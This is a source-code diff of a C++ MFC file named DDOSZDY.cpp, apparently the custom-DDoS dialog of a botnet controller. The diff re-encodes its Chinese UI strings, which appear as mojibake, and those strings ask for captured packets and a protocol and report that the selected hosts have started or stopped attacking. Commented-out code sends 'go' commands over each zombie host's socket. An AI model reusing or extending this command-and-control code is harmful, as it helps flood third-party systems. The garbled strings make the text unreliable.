@@ -1,4 +1,4 @@
-ï»¿// DDOSZDY.cpp : implementation file
+// DDOSZDY.cpp : implementation file
 //
 #include "stdafx.h"
 #include "MainFrm.h"
@@ -61,7 +61,7 @@ CDDOSZDY::CDDOSZDY()
 	m_thread2 = 10;
 	m_time = 10;
 	m_time2 = 10;
-	m_zdy = _T("è¯·ç²˜è´´æŠ“åŒ…å†…å®¹,ç›®å‰åªæ”¯æŒæœ€å¤§1Kæ•°æ®");
+	m_zdy = _T("ÇëÕ³Ìù×¥°üÄÚÈÝ,Ä¿Ç°Ö»Ö§³Ö×î´ó1KÊý¾Ý");
 	//}}AFX_DATA_INIT
 }
 
@@ -130,13 +130,13 @@ void CDDOSZDY::OnButtonBegin()
 	// TODO: Add 	UpdateData(TRUE);
 	if(cbao == 0)
 	{
-		MessageBox("è¯·é€‰æ‹©ä½¿ç”¨åè®®   ","æç¤º", MB_OK|MB_ICONWARNING);
+		MessageBox("ÇëÑ¡ÔñÊ¹ÓÃÐ­Òé   ","ÌáÊ¾", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	
 	if(zhwt == 0)
 	{
-		MessageBox("è¯·é€‰æ‹©å‘åŒ…æ–¹å¼   ","æç¤º", MB_OK|MB_ICONWARNING);
+		MessageBox("ÇëÑ¡Ôñ·¢°ü·½Ê½   ","ÌáÊ¾", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	
@@ -176,15 +176,15 @@ void CDDOSZDY::OnButtonBegin()
 // 		{
 // 			SOCKET SerSock = pList->GetItemData(i);
 // 			m_zdyiocp->SendMsg(SerSock,(char *)&go,sizeof(go));
-// 			pList->SetItemText(i,1,"æ´»åŠ¨");
+// 			pList->SetItemText(i,1,"»î¶¯");
 // 		}
 // 	}
 // 	n=pMsg->GetItemCount();
 // 	CTime time=CTime::GetCurrentTime();	
-// 	CString m_strTime=time.Format("%Yå¹´%mæœˆ%dæ—¥ %H:%M:%S");
+// 	CString m_strTime=time.Format("%YÄê%mÔÂ%dÈÕ %H:%M:%S");
 // 	n=pMsg->GetItemCount();
 // 	pMsg->InsertItem(n,m_strTime);
-// 	pMsg->SetItemText(n,1,"è¢«é€‰ä¸»æœºå·²ç»è¿›å…¥æ”»å‡»çŠ¶æ€"); 
+// 	pMsg->SetItemText(n,1,"±»Ñ¡Ö÷»úÒÑ¾­½øÈë¹¥»÷×´Ì¬"); 
 	
 	
 }
@@ -261,15 +261,15 @@ void CDDOSZDY::OnButtonStop()
 // 		{
 // 			SOCKET SerSock = pList->GetItemData(i);
 // 			m_zdyiocp->SendMsg(SerSock,(char *)&go,sizeof(go));
-// 			pList->SetItemText(i,1,"å¾…å‘½");
+// 			pList->SetItemText(i,1,"´ýÃü");
 // 		}
 // 	}
 // 	n=pMsg->GetItemCount();
 // 	CTime time=CTime::GetCurrentTime();	
-// 	CString m_strTime=time.Format("%Yå¹´%mæœˆ%dæ—¥ %H:%M:%S");
+// 	CString m_strTime=time.Format("%YÄê%mÔÂ%dÈÕ %H:%M:%S");
 // 	n=pMsg->GetItemCount();
 // 	pMsg->InsertItem(n,m_strTime);
-// 	pMsg->SetItemText(n,1,"è¢«é€‰ä¸»æœºå·²ç»åœæ­¢æ”»å‡»");
+// 	pMsg->SetItemText(n,1,"±»Ñ¡Ö÷»úÒÑ¾­Í£Ö¹¹¥»÷");
 }
 void CDDOSZDY::OnRadioTcp() 
 {
